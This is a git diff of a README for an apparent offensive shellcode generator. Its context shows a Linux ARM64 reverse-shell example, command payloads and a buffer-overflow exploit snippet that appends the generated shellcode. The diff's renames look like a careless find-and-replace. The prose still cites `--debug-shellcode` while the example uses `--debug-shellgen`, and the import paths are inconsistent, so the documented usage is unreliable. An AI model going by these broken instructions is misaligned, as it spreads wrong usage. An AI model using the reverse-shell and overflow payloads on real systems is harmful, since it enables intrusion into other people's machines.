@@ -239,7 +239,7 @@ See [USE_WITHOUT_ACTIVATE.md](USE_WITHOUT_ACTIVATE.md) for additional usage opti
   --cmd "whoami" \
   --arch arm64 \
   --format c \
-  --output shellcode.c
+  --output shellgen.c
 ```
 
 ## Command Line Options
@@ -416,9 +416,9 @@ The modular structure makes it easy to use as a library:
 
 ### Example 1: Generate Windows MessageBox
 ```python
-from shellgen.generators import WindowsGenerator
-from shellgen.payloads import windows_messagebox
-from shellgen.assembler import assemble_to_binary
+from src.generators import WindowsGenerator
+from src.payloads import windows_messagebox
+from src.assembler import assemble_to_binary
 
 # Build payload config
 config = windows_messagebox(
@@ -438,7 +438,7 @@ print(f"Shellcode: {len(shellcode)} bytes")
 
 ### Example 2: Generate Linux ARM64 Reverse Shell
 ```python
-from shellgen.generators import LinuxGenerator
+from src.generators import LinuxGenerator
 
 # Create generator for ARM64
 generator = LinuxGenerator(bad_chars={0x00}, arch='arm64')
@@ -457,7 +457,7 @@ asm_code = generator.generate(config)
 
 ### Example 3: Custom Windows Payload
 ```python
-from shellgen.generators import WindowsGenerator
+from src.generators import WindowsGenerator
 
 # Define custom API calls
 config = {
@@ -514,7 +514,7 @@ Use the `--debug-shellcode` flag to disassemble and map bad characters to instru
   --cmd "calc.exe" \
   --arch x86 \
   --bad-chars 00,0a,0d,20 \
-  --debug-shellcode
+  --debug-shellgen
 ```
 
 The debug output uses **Capstone** to disassemble the assembled shellcode and includes:
@@ -681,12 +681,12 @@ This tool is designed for **authorized security testing only**. Use cases includ
      --port 4444 \
      --arch arm \
      --format python \
-     --output shellcode.py
+     --output shellgen.py
    ```
 
 2. **Test in exploit script**
    ```python
-   from shellcode import shellcode
+   from shellgen import shellcode
 
    payload = b"A" * 264  # overflow to RIP
    payload += shellcode
